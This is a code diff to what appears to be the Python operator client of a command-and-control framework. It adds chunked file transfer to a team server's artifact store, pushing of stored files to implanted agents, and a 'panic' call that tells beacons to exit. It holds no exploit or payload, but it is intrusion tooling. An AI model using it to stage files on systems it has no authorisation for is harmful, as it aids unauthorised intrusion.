@@ -23,6 +23,10 @@ __all__ = ["OperatorClient", "OperatorError", "RpcResult", "CHUNK_MAX"]
 # see implant/rust/src/task.rs), so each chunk fits in a single RESULT frame.
 CHUNK_MAX = 900 * 1024
 
+# The size of one chunk when a file travels to or from the team server's
+# artifact store.  The frames are bounded, so a chunk has to fit in one RPC.
+ARTIFACT_CHUNK = 256 * 1024
+
 
 class OperatorError(Exception):
     pass
@@ -789,6 +793,133 @@ class OperatorClient:
             "sha256": digest,
             "chunks": max(1, (total + chunk - 1) // chunk),
         }
+
+    # -- the server-side file store ---------------------------------------
+    def artifact_list(self) -> List[Dict[str, Any]]:
+        """The artifacts the team server holds."""
+        res = self.rpc("artifact.list")
+        if not res.ok:
+            raise OperatorError(res.error)
+        return list((res.data or {}).get("artifacts", []))
+
+    def artifact_get(self, name: str, offset: int = 0,
+                     limit: int = 0) -> Dict[str, Any]:
+        """Read a chunk of a stored artifact."""
+        res = self.rpc("artifact.get",
+                       {"name": name, "offset": offset, "limit": limit})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data or {}
+
+    def artifact_put(self, name: str, data: bytes, offset: int = 0,
+                     eof: bool = True) -> Dict[str, Any]:
+        """Write a chunk of an artifact into the server's store."""
+        res = self.rpc("artifact.put",
+                       {"name": name, "data": data, "offset": offset, "eof": eof})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data or {}
+
+    def artifact_remove(self, name: str) -> Dict[str, Any]:
+        """Delete an artifact from the server's store."""
+        res = self.rpc("artifact.remove", {"name": name})
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data or {}
+
+    def artifact_push(self, name: str, agent_id: str,
+                      path: str = "") -> Dict[str, Any]:
+        """Push a stored artifact to an agent as a chain of upload tasks."""
+        args: Dict[str, Any] = {"name": name, "agent": agent_id}
+        if path:
+            args["path"] = path
+        res = self.rpc("artifact.push", args)
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data or {}
+
+    def artifact_upload(self, name: str, local: str, *,
+                        chunk: int = ARTIFACT_CHUNK) -> Dict[str, Any]:
+        """Put a local file into the server's store, in chunks.
+
+        The upload is chunked because the frames are bounded: a file that is
+        bigger than one frame arrives as a series of appends, and the store
+        only writes the blob when the last chunk says so.
+        """
+        chunk = max(1, min(int(chunk), ARTIFACT_CHUNK))
+        with open(local, "rb") as fh:
+            blob = fh.read()
+        total = len(blob)
+        digest = hashlib.sha256(blob).hexdigest()
+        offset = 0
+        info: Dict[str, Any] = {}
+        while True:
+            piece = blob[offset : offset + chunk]
+            eof = offset + len(piece) >= total
+            info = self.artifact_put(name, piece, offset=offset, eof=eof)
+            offset += len(piece)
+            if eof:
+                break
+        info = dict(info)
+        info["sha256"] = str(info.get("sha256", "")) or digest
+        info["size"] = int(info.get("size", total) or total)
+        info["local"] = local
+        return info
+
+    def artifact_download(self, name: str, local: str, *,
+                          chunk: int = ARTIFACT_CHUNK) -> Dict[str, Any]:
+        """Pull an artifact out of the server's store, in chunks.
+
+        The file is written to ``local + ".part"`` and renamed only after the
+        whole file arrived, so an interrupted transfer never leaves a
+        plausible-looking truncated file behind.
+        """
+        chunk = max(1, min(int(chunk), ARTIFACT_CHUNK))
+        tmp = local + ".part"
+        digest = hashlib.sha256()
+        offset = 0
+        with open(tmp, "wb") as fh:
+            while True:
+                data = self.artifact_get(name, offset=offset, limit=chunk)
+                piece = data.get("data") or b""
+                if isinstance(piece, str):
+                    piece = piece.encode()
+                piece = bytes(piece)
+                if piece:
+                    fh.write(piece)
+                    digest.update(piece)
+                    offset += len(piece)
+                if data.get("eof") or not piece:
+                    break
+        # The digest comes with the entry, so the copy can be checked against
+        # the one the server holds.  One byte is enough to read it.
+        head = self.artifact_get(name, offset=0, limit=1)
+        expected = str(head.get("sha256", "") or "")
+        os.replace(tmp, local)
+        result = {"name": name, "local": local, "bytes": offset,
+                  "sha256": digest.hexdigest(), "expected": expected}
+        if expected and expected != result["sha256"]:
+            raise OperatorError(
+                f"artifact hash {result['sha256']} != server hash {expected}")
+        return result
+
+    def panic(self, agent_ids: Optional[List[str]] = None,
+              all_agents: bool = False) -> Dict[str, Any]:
+        """Burn an engagement: tell the beacons to exit and stop their work.
+
+        The exit command is queued, so an agent that is asleep still dies on
+        its next check-in; from then on the server refuses every new task for
+        it.
+        """
+        args: Dict[str, Any] = {}
+        if agent_ids:
+            args["agents"] = list(agent_ids)
+        if all_agents:
+            args["all"] = True
+        res = self.rpc("agents.panic", args)
+        if not res.ok:
+            raise OperatorError(res.error)
+        return res.data or {}
 
     def wait_for_result(self, task_id: str, timeout: float = 60.0, poll: float = 1.0) -> Dict[str, Any]:
         """Poll until a task leaves the queued/delivered state."""
